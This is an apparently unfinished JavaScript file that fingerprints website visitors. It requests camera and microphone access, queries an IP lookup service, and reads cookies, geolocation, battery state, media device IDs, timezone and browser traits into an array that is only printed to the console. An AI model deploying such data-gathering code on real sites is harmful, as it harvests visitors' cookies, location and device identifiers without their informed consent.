 navigator.getUserMedia (
  // constraints
  {
     video: true,
     audio: true
  },

  // successCallback
  function(localMediaStream) {
     var video = document.querySelector('video');
     video.src = window.URL.createObjectURL(localMediaStream);
     video.onloadedmetadata = function(e) {
        // Do something with the video here.
     };
  },

  // errorCallback
  function(err) {
   if(err === PERMISSION_DENIED) {
     // Explain why you need permission and how to update the permission setting
   }
  }
);

//waiting for user response before data gathering


// Set Dataset
let DataOnUser =[];

// Get IP Data 
fetch('http://ip-api.com/json')
  .then(response => response.json())
  .then(data => {
    DataOnUser.push("IP Data: " + JSON.stringify(data));
  });


// Get language of the person visiting the website 
let language = navigator.language;
DataOnUser.push("Language: " + language);

// Get operating system of the person visiting the website 
let os = navigator.platform;
DataOnUser.push("Operating System: " + os);

// Get referrer of the person visiting the website // EMPTY DATA = WORKS OR?? (NEED TO TEST)
let referrer = document.referrer;
if(referrer=="")
{
  referrer= "No Refferer";
}
 DataOnUser.push("Reffering Website: " + referrer);


// Get time of visit 
let time = new Date();
DataOnUser.push("Visit Time: " + time);

// Get screen resolution 
let screenResolution = `${screen.width}x${screen.height}`;
DataOnUser.push("Screen Resolution: " + screenResolution);

// Get Cookies
let cookies = document.cookie;
DataOnUser.push("Cookies: " + cookies);

// Get request method
let method = 'GET';
DataOnUser.push("Method: " + method);

// Get request path
let path = window.location.pathname;
DataOnUser.push("Request Path: " + path);

// Get request parameters
let parameters = window.location.search;
DataOnUser.push("Request Parameters: " + parameters);
console.log(DataOnUser);

// Get geolocation 
if (navigator.geolocation) {
  navigator.geolocation.getCurrentPosition(function(position) {
    let latitude = position.coords.latitude;
    let longitude = position.coords.longitude;
    DataOnUser.push(latitude);
    DataOnUser.push(longitude);
  },
  function(error) {
    switch(error.code) {
        case error.PERMISSION_DENIED:
            console.log("User denied the request for Geolocation.");
            break;
        case error.POSITION_UNAVAILABLE:
            console.log("Location information is unavailable.");
            break;
        case error.TIMEOUT:
            console.log("The request to get user location timed out.");
            break;
        case error.UNKNOWN_ERROR:
            console.log("An unknown error occurred.");
            break;
    }
  });
} else {
  console.log("Geolocation is not supported by this browser.");
}

// Get User Agent String (browser, system etc)
let userAgent = navigator.userAgent;
DataOnUser.push("User Agent: " + userAgent);

// Get device type (mobile/desktop) 
let deviceType = /mobile/i.test(userAgent) ? "Mobile" : "Desktop";
DataOnUser.push("Device Type: " + deviceType);

// Get battery level
if (navigator.getBattery) {
  navigator.getBattery().then(function(battery) {
  let batteryLevel = battery.level * 100 + '%';
  DataOnUser.push("Battery Level: " + batteryLevel);
  });
  } else if (navigator.battery) {
  let batteryLevel = navigator.battery.level * 100 + '%';
  DataOnUser.push("Battery Level: " + batteryLevel);
  }

// Get preferred language list
let languageList = navigator.languages;
DataOnUser.push("Preferred Language List: " + languageList);

// Get device memory information
let memory = window.performance.memory;
DataOnUser.push("Device Memory: " + JSON.stringify(memory));

// Get timezone
let timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
DataOnUser.push("Timezone: " + timezone);

// Get media device information
navigator.mediaDevices.enumerateDevices().then(function(devices) {
  devices.forEach(function(device) {
  DataOnUser.push("Media Device: " + device.kind + " - " + device.label + " - " + device.deviceId);
  });
  });
  
  // Get online/offline status (if connected to the network)
  let onlineStatus = window.navigator.onLine ? 'Online' : 'Offline';
  DataOnUser.push("Online Status: " + onlineStatus);

//let data = navigator.
